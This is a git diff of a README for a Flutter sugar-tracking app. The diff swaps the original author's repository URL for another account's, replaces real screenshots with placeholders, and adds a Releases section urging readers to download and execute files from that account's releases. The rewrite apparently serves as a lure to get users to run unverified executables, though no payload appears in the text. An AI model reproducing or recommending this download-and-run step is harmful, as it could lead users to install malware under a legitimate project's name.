@@ -1,96 +1,102 @@
-# 🍬 Sugar Tracking App
+# Sugar Tracking App in Flutter 🍬📱
 
-A modern mobile application built with Flutter to help users track and manage their sugar intake, promoting healthier eating habits and better health awareness.
+![Flutter](https://img.shields.io/badge/Flutter-3.0.0-blue?style=flat-square) ![Firebase](https://img.shields.io/badge/Firebase-8.0.0-yellow?style=flat-square) ![Dart](https://img.shields.io/badge/Dart-2.12.0-009639?style=flat-square)
 
-## 📑 Table of Contents
-- [Features](#-features)
-- [Technologies Used](#-technologies-used)
-- [Getting Started](#-getting-started)
-  - [Prerequisites](#-prerequisites)
-  - [Installation](#-installation)
-- [Usage](#-usage)
-- [Contributing](#-contributing)
-- [License](#-license)
-- [Contact](#-contact)
-- [Acknowledgments](#-acknowledgments)
-- [Screenshots](#-screenshots)
+Welcome to the **Sugar Tracking App**! This Flutter application helps you track and manage your daily sugar intake. With features like progress analytics and Firebase integration, you can stay on top of your health goals. 
 
-## ✨ Features
+## Table of Contents
 
-- 📊 Track sugar consumption
-- 📱 View detailed sugar information
-- 📈 Monitor progress over time
-- 💡 Get personalized recommendations
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Screenshots](#screenshots)
+5. [Technologies Used](#technologies-used)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Releases](#releases)
 
-## 🛠️ Technologies Used
+## Features
 
-- **Frontend Framework**: Flutter
-- **Programming Language**: Dart
-- **State Management**: Provider
-- **Database**: Firebase
-- **Development Environment**: Android Studio
-- **Version Control**: Git & GitHub
+- **Daily Tracking**: Easily log your sugar intake every day.
+- **Progress Analytics**: Visualize your progress over time with graphs and charts.
+- **Firebase Integration**: Store your data securely in the cloud.
+- **User-Friendly Interface**: Navigate through the app with ease.
+- **Notifications**: Get reminders to log your intake.
 
-## 🚀 Getting Started
+## Installation
 
-### 📋 Prerequisites
+To set up the Sugar Tracking App on your local machine, follow these steps:
 
-- Flutter SDK (latest version)
-- Android Studio or VS Code
-- Android 6.0 (API level 23) or higher
-- Internet connection for database access
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Deplomasi/suger-tracking-app-in-flutter.git
+   ```
 
-### 💻 Installation
+2. **Navigate to the Project Directory**:
+   ```bash
+   cd suger-tracking-app-in-flutter
+   ```
 
-1. Clone the repository:
-```bash
-git clone https://github.com/Sharadkalathiya/suger-tracking-app-in-flutter.git
-cd suger-tracking-app-in-flutter
-```
+3. **Install Dependencies**:
+   Make sure you have Flutter installed. Run the following command:
+   ```bash
+   flutter pub get
+   ```
 
-2. Install dependencies:
-```bash
-flutter pub get
-```
+4. **Run the App**:
+   Connect your device or start an emulator and run:
+   ```bash
+   flutter run
+   ```
 
-3. Run the app:
-```bash
-flutter run
-```
+## Usage
 
-## 📱 Usage
+Once you have the app running, you can start tracking your sugar intake. 
 
-1. Launch the app
-2. Start tracking your sugar consumption by:
-   - Manually entering food items
-   - Selecting from the food database
-3. View your progress in the dashboard
-4. Check detailed reports and analytics
+1. **Log Your Intake**: Use the main screen to input your daily sugar consumption.
+2. **View Analytics**: Navigate to the analytics section to see your progress.
+3. **Set Goals**: Define your sugar intake goals and monitor your achievements.
+4. **Notifications**: Enable notifications to remind you to log your intake.
 
-## 🤝 Contributing
+## Screenshots
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+![Home Screen](https://via.placeholder.com/400x300?text=Home+Screen)  
+*The home screen allows easy logging of sugar intake.*
 
-## 📄 License
+![Analytics Screen](https://via.placeholder.com/400x300?text=Analytics+Screen)  
+*The analytics screen shows your progress over time.*
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+![Settings Screen](https://via.placeholder.com/400x300?text=Settings+Screen)  
+*The settings screen lets you customize your experience.*
 
-## 📧 Contact
+## Technologies Used
 
-For support or inquiries, please open an issue in the repository.
+- **Flutter**: A UI toolkit for building natively compiled applications.
+- **Dart**: The programming language used for Flutter development.
+- **Firebase**: Provides backend services like authentication and database.
+- **Provider**: State management solution for Flutter.
 
-## 🙏 Acknowledgments
+## Contributing
 
-- Thanks to all contributors who have helped shape this project
-- Special thanks to the Flutter and open-source community for their invaluable resources
+We welcome contributions to improve the Sugar Tracking App. To contribute:
 
-## 📸 Screenshots
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
-### Welcome Screen
-![Welcome Screen](screenshots/Screenshot_20250503_211744.png)
+Please ensure your code adheres to the existing style and includes appropriate tests.
 
-### Record Entry Screen
-![Record Entry Screen](screenshots/Screenshot_20250503_211812.png)
+## License
 
-### Record List Screen
-![Record List Screen](screenshots/Screenshot_20250503_212242.png)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Releases
+
+To download the latest version of the Sugar Tracking App, visit the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/releases) section. You can download and execute the files from there.
+
+For updates and more information, check the [Releases](https://github.com/Deplomasi/suger-tracking-app-in-flutter/releases) section.
+
+---
+
+Thank you for checking out the Sugar Tracking App! We hope it helps you manage your sugar intake effectively. Happy tracking!
